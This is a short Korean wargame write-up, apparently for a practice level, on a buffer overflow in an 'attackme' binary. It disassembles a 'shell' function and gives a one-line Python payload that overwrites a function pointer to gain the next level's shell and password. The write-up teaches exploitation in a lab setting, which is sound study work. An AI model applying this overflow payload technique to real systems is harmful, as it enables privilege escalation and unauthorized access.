@@ -1,0 +1,49 @@
+
+
+56-16 = 40 바이트 !!
+
+40바이트를 기본으로 주고 뒤에 주소값을 넣어서 버퍼오버플로우를 일으킴 !!
+
+일단 shell 함수를 실행시켜야 level17 쉘 권한을 얻을수있음 !!
+
+0x0804851e <main+6>:    mov    DWORD PTR [ebp-16],0x8048500 
+
+이부분을 잘보면 16바이트 부분에 입력 되면 shell 을 실행시킬수있음
+
+주소는 0x8048500
+
+즉  printit 함수는  즉 ebp-16 에 0x8048500 입력하고 call eax로 printit함수를 호출한것이다.
+
+이제 버퍼 오버플로우를 발생시켜서 ebp-16 위치에 shell 함수 주소를 넣으면 call eax가 호출할떄 
+shell함수도 호출할수있게 할수있다.
+
+이제 shell함수를 실행하기위한 시작 주소를 알아보자. 
+
+disas shell 을 입력하면
+
+0x080484d0 <shell+0>:   push   %ebp 	@@@@ 집중
+0x080484d1 <shell+1>:   mov    %esp,%ebp
+0x080484d3 <shell+3>:   sub    $0x8,%esp
+0x080484d6 <shell+6>:   sub    $0x8,%esp
+0x080484d9 <shell+9>:   push   $0xc19
+0x080484de <shell+14>:  push   $0xc19
+0x080484e3 <shell+19>:  call   0x80483b4 <setreuid>
+0x080484e8 <shell+24>:  add    $0x10,%esp
+0x080484eb <shell+27>:  sub    $0xc,%esp
+0x080484ee <shell+30>:  push   $0x80485b8
+0x080484f3 <shell+35>:  call   0x8048364 <system>
+0x080484f8 <shell+40>:  add    $0x10,%esp
+0x080484fb <shell+43>:  leave
+0x080484fc <shell+44>:  ret
+0x080484fd <shell+45>:  lea    0x0(%esi),%esi
+
+가 나오는데 시작 주소가 0x080484d0 라는것을 알아냈다. 즉 버퍼 오버플로우를 일으키고 
+
+저 시작주소를 추가로 입력해준다면 shell 함수가 실행 된다는 의미이다. 
+
+한번 식을 만들어보자.
+
+(python -c 'print"\x90"*40+"\xd0\x84\x04\x08"';cat)|./attackme 이고 이것을 입력하고
+
+my-pass 를 입력하면 level17로가는 패스워드가 나온다. !!
+
